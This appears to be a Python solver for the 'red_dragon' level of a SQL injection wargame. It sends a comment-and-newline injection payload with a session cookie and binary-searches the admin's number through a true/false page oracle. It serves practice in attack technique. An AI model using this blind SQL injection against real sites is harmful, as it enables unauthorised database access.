#!/usr/bin/env python3
# coding: utf-8

import requests
from math import floor

headers = {
    'Cookie': 'PHPSESSID=6b28r4o43epapipkuj2n3oposs',
}


def is_true(query):
    url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php?id='||no>%23&no=%0a{0}".format(query)
    r = requests.get(url, headers=headers)
    if r.text.find('<h2>Hello admin</h2>') > -1:
        return True
    return False


def guess_no():
    bottom = 100000000
    top = 10000000000
    while True:
        mid = floor((bottom + top) / 2)
        if bottom == top:
            return mid
        print('top :', top, ' | mid :', mid, ' | bottom :', bottom)
        query = "{0}".format(mid)
        if is_true(query):
            if top == bottom:
                return chr(mid)
            bottom = mid + 1
        else:
            if mid == top:
                return chr(mid)
            top = mid


def main():
    print('[*] admin no :', guess_no())


if __name__ == '__main__':
    main()
